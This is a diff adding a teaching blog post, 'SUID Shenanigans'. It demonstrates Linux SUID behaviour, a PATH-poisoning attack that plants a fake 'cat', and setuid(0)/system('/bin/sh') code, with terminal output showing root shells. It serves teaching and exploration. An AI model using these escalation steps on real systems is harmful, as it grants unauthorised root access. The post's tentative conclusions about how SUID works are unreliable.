@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>Dan Quixote Codes - SUID Shenanigans</title>
+  <meta charset="utf-8" />
+  <meta name="generator" content="Pelican" />
+
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <!-- Bootstrap CSS -->
+  <!--<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-giJF6kkoqNQ00vy+HMDP7azOuL0xtbfIcaT9wjKHr8RbDVddVHyTfAAsrekwKmP1" crossorigin="anonymous">-->
+
+  <!-- Syntax -->
+  <link rel="stylesheet" href="/theme/css/pygment.css">
+
+  <!-- Fonts -->
+  <link rel="stylesheet" href="/theme/css/fonts.css">
+  <!-- Custom bootstrap -->
+  <link rel="stylesheet" href="/theme/css/theme.css">
+   
+
+  
+
+
+    <meta name="tags" content="hacking" />
+    <meta name="tags" content="linux" />
+
+</head>
+
+<body>
+  <div class="container-xxl maincontent">
+
+      <!-- Page Header -->
+      <header>
+	<div class="jumbotron p-3 p-md-5 my-rounded my-highlight d-none d-lg-block">
+          <div class="col-md-9 px-0">
+	    <h1 class="display-1">
+	      Dan Quixote Codes
+	    </h1>
+	    
+	    <p class="lead terminal"> Adventures in Teaching, Programming, and Cyber Security.</p>
+          </div>
+	</div>
+	  
+<nav class="navbar navbar-expand-lg mt-1">
+  <div class="container-fluid">
+    <a class="navbar-brand d-lg-none" href="/">Dan Quixote Codes</a>
+    <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <span class="navtoggle bi bi-arrows-expand"></span>
+      <!--<span class="navtoggle bi bi-arrows-collapse"></span>-->
+    </button>
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav me-auto mb-2 mb-lg-0">
+        <li class="nav-item">
+	  
+	  <a 	     class="nav-link"
+	     href="/">Blog</a>
+        </li>
+      </ul>
+      <ul class="d-flex navbar-nav">
+	<li class="nav-item ml-auto">
+	  <a class="nav-link" href="/pages/about-me.html">About</a>
+	</li>
+      </ul>
+    </div>
+  </div>
+</nav>      
+      </header><!-- /#banner -->
+      
+      <div class="row mt-5"> 	<!-- Page Content -->
+	<div class="col">
+    
+    <section id="content" class="body">
+  <header class="terminal">
+    <h2 class="entry-title">
+      <a class="dark-terminal" href="/">~/blog$ </a><a href="/suid-shenanigans.html" rel="bookmark"
+         title="Permalink to SUID Shenanigans">SUID Shenanigans</a></h2>
+ 
+  </header>
+
+  
+  <footer class="post-info dark-terminal">
+    <span>Published:</span>
+    <time class="published" datetime="2019-03-19T19:28:56+00:00">
+      Tue 19 March 2019
+    </time>
+    <address class="vcard author">
+      Author       <i class="bi bi-person"></i> <a class="url fn" href="/author/dang.html">DanG</a>
+    </address>
+    <div class="category">
+        In: <a href="/category/hacking.html">hacking</a>
+    </div>
+    <div class="tags">
+        Tags:
+            <i class="bi bi-tag"></i><a href="/tag/hacking.html">hacking</a>
+            <i class="bi bi-tag"></i><a href="/tag/linux.html">linux</a>
+    </div>
+  </footer><!-- /.post-info -->
+  <div class="entry-content pt-2">
+    <p>While prepping for the overflow lecture noticed some new behaviour with
+SUID, Haven't been able to find any changes in the Kernel log, so
+thought I would play to work out the behaviour</p>
+<h1>Path Poisoning Weirdness</h1>
+<h2>Old Behaviour</h2>
+<p>In the Linux Trainer, the following code was used in a path poisoning example.</p>
+<div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
+
+<span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span><span class="w"></span>
+<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Attempting to access file:</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="n">system</span><span class="p">(</span><span class="s">&quot;cat /home/level18/File.txt&quot;</span><span class="p">);</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+</code></pre></div>
+
+<p>Once installed, SUID permissions were set</p>
+<div class="highlight"><pre><span></span><code>level18@f0432d98b859:~$ ls -l
+total <span class="m">32</span>
+-r-------- <span class="m">1</span> elev18  elev18     <span class="m">36</span> Feb <span class="m">11</span> <span class="m">10</span>:00 File.txt
+-r-------- <span class="m">1</span> elev18  elev18     <span class="m">64</span> Feb <span class="m">11</span> <span class="m">10</span>:00 Pass.txt
+---s--x--x <span class="m">1</span> elev18  level18 <span class="m">16624</span> Feb <span class="m">11</span> <span class="m">10</span>:00 runme
+-rwxr--r-- <span class="m">1</span> level18 level18   <span class="m">141</span> Feb <span class="m">11</span> <span class="m">10</span>:00 source.c
+level18@f0432d98b859:~$ 
+</code></pre></div>
+
+<p>We could do the Classic Path poison attack and elevate the permissions</p>
+<div class="highlight"><pre><span></span><code>level18@f0432d98b859:~$ <span class="nb">echo</span> <span class="s2">&quot;/bin/sh&quot;</span> &gt; cat
+level18@f0432d98b859:~$ chmod +x cat
+level18@f0432d98b859:~$ <span class="nv">PATH</span><span class="o">=</span>.:<span class="nv">$PATH</span> ./runme 
+Attempting to access file:
+$ whoami
+elev18
+$ 
+</code></pre></div>
+
+<h2>Recreating on my Arch System</h2>
+<p>So take the same code, compile and set the permissions</p>
+<div class="highlight"><pre><span></span><code>dang@dang-laptop ~/Coding/Testing$ ls -l
+-rwsr-sr-x <span class="m">1</span> root dang <span class="m">16624</span> Mar <span class="m">19</span> <span class="m">19</span>:40 a.out
+-rw-r--r-- <span class="m">1</span> dang dang   <span class="m">141</span> Mar <span class="m">19</span> <span class="m">19</span>:40 Testcode.c
+dang@dang-laptop ~/Coding/Testing$ 
+</code></pre></div>
+
+<p>And try to recreate the exploit</p>
+<div class="highlight"><pre><span></span><code>dang@dang-laptop ~/Coding/Testing$ <span class="nb">echo</span> <span class="s2">&quot;/bin/sh&quot;</span> &gt; cat
+dang@dang-laptop ~/Coding/Testing$ chmod +x cat
+dang@dang-laptop ~/Coding/Testing$ <span class="nv">PATH</span><span class="o">=</span>.:<span class="nv">$PATH</span> ./a.out
+Attempting to access file:
+sh-5.0$ whoami
+dang
+sh-5.0$ 
+</code></pre></div>
+
+<p>So it looks like we get different behaviour between the installs, SUID
+doesn't elevate permissions on the more modern system.</p>
+<h1>Digging a Bit Deeper.</h1>
+<h2>Setting SUID on the file system</h2>
+<p>To avoid the confusion with the path poisoning, lets work on a simpler version of the file.</p>
+<div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
+
+<span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span><span class="w"></span>
+<span class="w">  </span><span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">);</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+</code></pre></div>
+
+<p>Set SUID bit in the file systems, and when we run this we still don't
+get a root shell??</p>
+<div class="highlight"><pre><span></span><code>dang@dang-laptop ~/Coding/Testing$ ls -l
+-rwsr-sr-x <span class="m">1</span> root dang <span class="m">16576</span> Mar <span class="m">19</span> <span class="m">19</span>:49 a.out
+-rwxr-xr-x <span class="m">1</span> dang dang     <span class="m">8</span> Mar <span class="m">19</span> <span class="m">19</span>:41 cat
+-rw-r--r-- <span class="m">1</span> dang dang    <span class="m">80</span> Mar <span class="m">19</span> <span class="m">19</span>:48 Testcode.c
+-rw-r--r-- <span class="m">1</span> dang dang   <span class="m">141</span> Mar <span class="m">19</span> <span class="m">19</span>:40 Testcode.c~
+dang@dang-laptop ~/Coding/Testing$ ./a.out                                                                          
+sh-5.0$ id
+<span class="nv">uid</span><span class="o">=</span><span class="m">1000</span><span class="o">(</span>dang<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span><span class="m">1000</span><span class="o">(</span>dang<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span><span class="m">1000</span><span class="o">(</span>dang<span class="o">)</span>,977<span class="o">(</span>docker<span class="o">)</span>,987<span class="o">(</span>uucp<span class="o">)</span>,998<span class="o">(</span>wheel<span class="o">)</span>
+sh-5.0$ 
+</code></pre></div>
+
+<h2>Setting SUID in the Binary</h2>
+<p>However, if we add a call to SUID inside the binary we get slightly
+different behaviour</p>
+<div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sys/types.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
+
+<span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span><span class="w"></span>
+<span class="w">  </span><span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">);</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+</code></pre></div>
+
+<p>Compile and Run, which doesn't help us:</p>
+<div class="highlight"><pre><span></span><code>dang@dang-laptop ~/Coding/Testing$ ls -l                                                                            
+total <span class="m">32</span>
+-rwxr-xr-x <span class="m">1</span> dang dang <span class="m">16624</span> Mar <span class="m">19</span> <span class="m">19</span>:53 a.out
+-rwxr-xr-x <span class="m">1</span> dang dang     <span class="m">8</span> Mar <span class="m">19</span> <span class="m">19</span>:41 cat
+-rw-r--r-- <span class="m">1</span> dang dang   <span class="m">136</span> Mar <span class="m">19</span> <span class="m">19</span>:52 Testcode.c
+-rw-r--r-- <span class="m">1</span> dang dang   <span class="m">141</span> Mar <span class="m">19</span> <span class="m">19</span>:40 Testcode.c~
+dang@dang-laptop ~/Coding/Testing$ ./a.out                                                                          
+sh-5.0$ id
+<span class="nv">uid</span><span class="o">=</span><span class="m">1000</span><span class="o">(</span>dang<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span><span class="m">1000</span><span class="o">(</span>dang<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span><span class="m">1000</span><span class="o">(</span>dang<span class="o">)</span>,977<span class="o">(</span>docker<span class="o">)</span>,987<span class="o">(</span>uucp<span class="o">)</span>,998<span class="o">(</span>wheel<span class="o">)</span>
+sh-5.0$ 
+</code></pre></div>
+
+<p>If we also put the file system SUID bit (and owner to root) we get the desired result</p>
+<div class="highlight"><pre><span></span><code>dang@dang-laptop ~/Coding/Testing$ ls -l                                                                            
+total <span class="m">36</span>
+-rwsr-sr-x <span class="m">1</span> root dang <span class="m">16624</span> Mar <span class="m">19</span> <span class="m">19</span>:53  a.out
+-rwxr-xr-x <span class="m">1</span> dang dang     <span class="m">8</span> Mar <span class="m">19</span> <span class="m">19</span>:41  cat
+-rw-r--r-- <span class="m">1</span> dang dang   <span class="m">136</span> Mar <span class="m">19</span> <span class="m">19</span>:54 <span class="s1">&#39;#Testcode.c#&#39;</span>
+-rw-r--r-- <span class="m">1</span> dang dang   <span class="m">136</span> Mar <span class="m">19</span> <span class="m">19</span>:52  Testcode.c
+-rw-r--r-- <span class="m">1</span> dang dang   <span class="m">141</span> Mar <span class="m">19</span> <span class="m">19</span>:40  Testcode.c~
+dang@dang-laptop ~/Coding/Testing$ ./a.out                                                                          
+sh-5.0# id
+<span class="nv">uid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span><span class="m">1000</span><span class="o">(</span>dang<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span><span class="m">1000</span><span class="o">(</span>dang<span class="o">)</span>,977<span class="o">(</span>docker<span class="o">)</span>,987<span class="o">(</span>uucp<span class="o">)</span>,998<span class="o">(</span>wheel<span class="o">)</span>
+sh-5.0# 
+</code></pre></div>
+
+<p>So it looks like we need to have SUID set in both the file, and the
+file system.</p>
+<h2>Dealing with Other users.</h2>
+<p>Lets add a third "Testuser" to the mix (Note, we need to set
+permissions of the <code>~/Coding/TEsting</code> directory to 777 to allow
+the testuser to access the files.</p>
+<p>We keep both <code>setuserid</code> in the source and the file system SUID
+bit, and the standard privesc still works as expected.</p>
+<div class="highlight"><pre><span></span><code>dang@dang-laptop ~/Coding/Testing$ ./a.out                                  
+sh-5.0# whoami
+root
+sh-5.0# 
+</code></pre></div>
+
+<div class="highlight"><pre><span></span><code><span class="o">[</span>testuser@dang-laptop Testing<span class="o">]</span>$ ./a.out 
+sh-5.0# whoami
+root
+sh-5.0# <span class="nb">exit</span>
+<span class="nb">exit</span>
+<span class="o">[</span>testuser@dang-laptop Testing<span class="o">]</span>$ <span class="nb">pwd</span>
+/home/dang/Coding/Testing
+<span class="o">[</span>testuser@dang-laptop Testing<span class="o">]</span>$ ./a.out 
+sh-5.0# whoami
+root
+sh-5.0# 
+</code></pre></div>
+
+<h2>Setting User ID to another user.</h2>
+<p>If we modify the userid in the binary (for example to dang).
+And then set the file system SUID bit to that user the elevation doesn't work</p>
+<div class="highlight"><pre><span></span><code>sh-5.0$ ls -l
+total <span class="m">28</span>
+-rwsr-xr-x <span class="m">1</span> dang dang <span class="m">16624</span> Mar <span class="m">20</span> <span class="m">18</span>:01 a.out
+-rw-r--r-- <span class="m">1</span> root root   <span class="m">139</span> Mar <span class="m">20</span> <span class="m">18</span>:01 Testcode.c
+-rw-r--r-- <span class="m">1</span> root root   <span class="m">136</span> Mar <span class="m">20</span> <span class="m">17</span>:43 Testcode.c~
+sh-5.0$ ./a.out 
+sh-5.0$ id
+<span class="nv">uid</span><span class="o">=</span><span class="m">1001</span><span class="o">(</span>testuser<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span><span class="m">1001</span><span class="o">(</span>testuser<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span><span class="m">1001</span><span class="o">(</span>testuser<span class="o">)</span>
+sh-5.0$ 
+</code></pre></div>
+
+<p>However set the File system owner to root, and the SUID bit and we get the userchange.</p>
+<div class="highlight"><pre><span></span><code>sh-5.0$ ls -l
+total <span class="m">28</span>
+-rwsr-xr-x <span class="m">1</span> root dang <span class="m">16624</span> Mar <span class="m">20</span> <span class="m">18</span>:01 a.out
+-rw-r--r-- <span class="m">1</span> root root   <span class="m">139</span> Mar <span class="m">20</span> <span class="m">18</span>:01 Testcode.c
+-rw-r--r-- <span class="m">1</span> root root   <span class="m">136</span> Mar <span class="m">20</span> <span class="m">17</span>:43 Testcode.c~
+sh-5.0$ ./a.out 
+sh-5.0$ id
+<span class="nv">uid</span><span class="o">=</span><span class="m">1000</span><span class="o">(</span>dang<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span><span class="m">1001</span><span class="o">(</span>testuser<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span><span class="m">1001</span><span class="o">(</span>testuser<span class="o">)</span>
+sh-5.0$ 
+</code></pre></div>
+
+<p>This is behaviour is not continued with Group permissions</p>
+<div class="highlight"><pre><span></span><code><span class="o">[</span>testuser@dang-laptop SUIDTest<span class="o">]</span>$ ls -l
+total <span class="m">28</span>
+-rwxr-sr-x <span class="m">1</span> dang root <span class="m">16624</span> Mar <span class="m">20</span> <span class="m">18</span>:01 a.out
+-rw-r--r-- <span class="m">1</span> root root   <span class="m">139</span> Mar <span class="m">20</span> <span class="m">18</span>:01 Testcode.c
+-rw-r--r-- <span class="m">1</span> root root   <span class="m">136</span> Mar <span class="m">20</span> <span class="m">17</span>:43 Testcode.c~
+<span class="o">[</span>testuser@dang-laptop SUIDTest<span class="o">]</span>$ ./a.out 
+sh-5.0$ whoami
+testuser
+</code></pre></div>
+
+<p>So It looks like we need to have a root user, regardless of the user
+we are trying to SUID to.</p>
+<h1>Even Weirder.  Doesn't appear to work in TMP.</h1>
+<p>So we compare the same, setup in user dir and /tmp/</p>
+<div class="highlight"><pre><span></span><code><span class="o">[</span>testuser@dang-laptop Demo<span class="o">]</span>$ <span class="nb">pwd</span>
+/tmp/Demo
+<span class="o">[</span>testuser@dang-laptop Demo<span class="o">]</span>$ ls -l
+total <span class="m">24</span>
+-rwsr-sr-x <span class="m">1</span> root root <span class="m">16624</span> Mar <span class="m">19</span> <span class="m">22</span>:36 a.out
+-rw-r--r-- <span class="m">1</span> dang dang   <span class="m">136</span> Mar <span class="m">19</span> <span class="m">19</span>:52 Testcode.c
+<span class="o">[</span>testuser@dang-laptop Demo<span class="o">]</span>$ ./a.out 
+sh-5.0$ 
+</code></pre></div>
+
+<div class="highlight"><pre><span></span><code>dang@dang-laptop ~/Coding/Testing$ ls -l                                    
+total <span class="m">32</span>
+-rwsr-sr-x <span class="m">1</span> root root <span class="m">16624</span> Mar <span class="m">19</span> <span class="m">22</span>:37 a.out
+-rwxr-xr-x <span class="m">1</span> dang dang     <span class="m">8</span> Mar <span class="m">19</span> <span class="m">19</span>:41 cat
+-rw-r--r-- <span class="m">1</span> dang dang   <span class="m">136</span> Mar <span class="m">19</span> <span class="m">22</span>:34 Testcode.c
+-rw-r--r-- <span class="m">1</span> dang dang   <span class="m">141</span> Mar <span class="m">19</span> <span class="m">19</span>:40 Testcode.c~
+dang@dang-laptop ~/Coding/Testing$ ./a.out                                  
+sh-5.0# 
+</code></pre></div>
+
+<p>What about other Directories</p>
+<p>Stashing the file in OPT appears to work for both users</p>
+<div class="highlight"><pre><span></span><code>dang@dang-laptop /opt/SUIDTest$ ls -l                                                                               
+total <span class="m">24</span>
+-rwsr-xr-x <span class="m">1</span> root root <span class="m">16624</span> Mar <span class="m">20</span> <span class="m">17</span>:43 a.out
+-rw-r--r-- <span class="m">1</span> root root   <span class="m">136</span> Mar <span class="m">20</span> <span class="m">17</span>:43 Testcode.c
+dang@dang-laptop /opt/SUIDTest$ id                                                                                  
+<span class="nv">uid</span><span class="o">=</span><span class="m">1000</span><span class="o">(</span>dang<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span><span class="m">1000</span><span class="o">(</span>dang<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span><span class="m">1000</span><span class="o">(</span>dang<span class="o">)</span>,977<span class="o">(</span>docker<span class="o">)</span>,987<span class="o">(</span>uucp<span class="o">)</span>,998<span class="o">(</span>wheel<span class="o">)</span>
+dang@dang-laptop /opt/SUIDTest$ ./a.out                                                                             
+sh-5.0# id
+<span class="nv">uid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span><span class="m">1000</span><span class="o">(</span>dang<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span><span class="m">1000</span><span class="o">(</span>dang<span class="o">)</span>,977<span class="o">(</span>docker<span class="o">)</span>,987<span class="o">(</span>uucp<span class="o">)</span>,998<span class="o">(</span>wheel<span class="o">)</span>
+sh-5.0# 
+</code></pre></div>
+
+<h1>Summary</h1>
+<ul>
+<li>SUID no longer appears to work on a purely file system basis</li>
+<li>Need to set userid inside the binary also.</li>
+<li>Appears we need the owner of the file to be root, for any kind of
+  SUID to happen.</li>
+</ul>
+<p>Not sure how I feel about this, while its probably a good idea to force
+the coder set the SUID flag in both the binary, and the file system,
+other things bother me.  Needing the file to be owned by root
+certainly seems a bit strange, and seems likely to lead to cockups.</p>
+<blockquote>
+<p>NOTE: This is initial thoughts, perhaps doing something other than a
+system call would show more expected behaviour, I will get around to
+testing this soon.</p>
+</blockquote>
+  </div><!-- /.entry-content -->
+</section>
+	</div>
+	
+      </div>     </div> 
+  <!-- Option 1: Bootstrap Bundle with Popper -->
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta1/dist/js/bootstrap.bundle.min.js" integrity="sha384-ygbV9kiqUc6oa4msXn9868pTtWMgiQaeYH7/t7LECLbyPA2x65Kgf80OJFdroafW" crossorigin="anonymous"></script>
+
+</body>
